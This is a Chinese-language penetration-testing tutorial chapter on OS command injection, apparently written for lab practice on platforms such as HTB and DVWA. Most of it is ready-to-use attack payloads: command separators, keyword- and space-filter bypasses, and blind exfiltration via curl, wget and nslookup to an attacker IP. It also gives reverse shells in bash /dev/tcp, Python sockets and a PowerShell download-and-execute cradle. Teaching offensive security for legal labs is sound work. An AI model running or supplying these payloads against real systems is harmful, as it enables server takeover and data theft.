# Ch 14 — 命令注入（Command Injection）

> 目標：識別命令注入點，能繞過常見過濾，從 OS 命令執行直接取得反彈 shell。

## 什麼是命令注入

Web 應用把使用者輸入直接傳給 OS 命令：

```php
// 有漏洞的程式碼
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);

// 正常輸入：ip=8.8.8.8
ping -c 4 8.8.8.8

// 攻擊輸入：ip=8.8.8.8; id
ping -c 4 8.8.8.8; id
```

你可以用 shell 的特殊字元串接額外的命令。

## 命令分隔符

```bash
# Linux
;    → 不管前面成功與否，都執行後面
&&   → 前面成功才執行後面
||   → 前面失敗才執行後面
`cmd`→ 反引號，命令替換
$(cmd)→ 命令替換

# Windows（CMD）
&    → 不管前面，都執行後面
&&   → 前面成功才執行後面
||   → 前面失敗才執行後面
|    → Pipe

# Payload 範例
;id
;whoami
;cat /etc/passwd
&& id
| id
`id`
$(id)
```

## 識別注入點

任何「把輸入傳給後端處理」的欄位都可能有注入：

```
網路工具（ping、nslookup、traceroute）
檔案操作
報告生成
系統管理功能
```

### 測試方法

```bash
# 直接加命令分隔符
input=127.0.0.1;id
input=127.0.0.1 && id
input=127.0.0.1 | id

# 時間延遲（Blind，確認有注入）
input=127.0.0.1; sleep 5
# 回應延遲 5 秒 = 注入成功

# 帶外（Out-of-band，當輸出看不到時）
input=127.0.0.1; ping -c 1 10.10.14.5
# 在 Kali 用 tcpdump 聽 ICMP
sudo tcpdump -i tun0 icmp
```

## 繞過過濾

### 過濾空格

```bash
# 用 ${IFS}（內部欄位分隔符）替代空格
cat${IFS}/etc/passwd

# Tab 替代
cat	/etc/passwd   # 中間是 Tab

# 大括號展開
{cat,/etc/passwd}
```

### 過濾關鍵字

```bash
# 字串分割
c'a't /etc/passwd
c"a"t /etc/passwd

# 編碼
$(echo 'Y2F0' | base64 -d) /etc/passwd  # Y2F0 = cat
`printf '\x63\x61\x74'` /etc/passwd       # hex

# 通配符
/bin/c?t /etc/passwd     # ? 匹配任意單字元
/bin/ca* /etc/passwd     # * 匹配任意字串
```

### 過濾斜線

```bash
echo '/etc/passwd' | tr '/' '/'   # 無效
${HOME:0:1}etc${HOME:0:1}passwd   # 用 HOME 變數的 /
```

## Blind 命令注入

看不到輸出，但知道有注入（靠時間延遲確認）：

### DNS 外帶（DNS Exfiltration）

```bash
# 把輸出帶出來
input=127.0.0.1; nslookup $(whoami).10.10.14.5.nip.io
# 在 Kali 用 tcpdump 看 DNS 查詢
# 或用 Burp Collaborator（需 Pro）
```

### HTTP 外帶

```bash
# 把命令輸出放進 HTTP 請求
input=127.0.0.1; curl http://10.10.14.5:8080/$(id)
input=127.0.0.1; wget "http://10.10.14.5:8080/$(whoami)"

# 在 Kali 開 HTTP 伺服器看 log
python3 -m http.server 8080
```

### 寫入檔案

```bash
# 把輸出寫進 Web 可訪問的檔案
input=127.0.0.1; id > /var/www/html/output.txt
# 然後訪問 http://target/output.txt
```

## 取得反彈 Shell

確認有注入後，直接取 shell：

```bash
# Kali 開監聽
nc -nvlp 4444

# Payload（URL 編碼過的版本給 Burp 用）
# 原始：
127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'

# URL 編碼：
127.0.0.1;%20bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F4444%200%3E%261%27

# Python 反彈：
127.0.0.1; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Windows 命令注入

Windows 的分隔符不同：

```cmd
127.0.0.1 & whoami
127.0.0.1 && whoami
127.0.0.1 | whoami

# 反彈 shell（需要靶機有 PowerShell）
127.0.0.1 & powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-PowerShellTcp.ps1')"
```

## 自動化測試工具

### commix

```bash
# 自動偵測和利用命令注入
commix --url "http://target/?ip=INJECT_HERE"

# POST 請求
commix --url "http://target/ping.php" --data "ip=INJECT_HERE"

# 有 cookie 的情況
commix --url "http://target/?ip=INJECT_HERE" --cookie="session=abc123"
```

## 本章對應靶機

| 機器 | 命令注入重點 |
|------|------------|
| THM Command Injection | 專門練習，各種過濾繞過 |
| HTB Shocker | Apache ShellShock（環境變數命令注入） |
| DVWA Command Injection | 從 Low 到 High 難度 |

## 自我檢核

- [ ] 知道 `;`, `&&`, `|`, `` ` `` 各自的行為差異
- [ ] 能識別 Blind 注入（靠 sleep 延遲確認）
- [ ] 能用 DNS 或 HTTP 外帶 Blind 注入的輸出
- [ ] 能把命令注入轉成反彈 shell

→ [Ch 15 身份驗證繞過：預設憑證、弱 JWT、登入繞過](./15-auth-bypass.md)
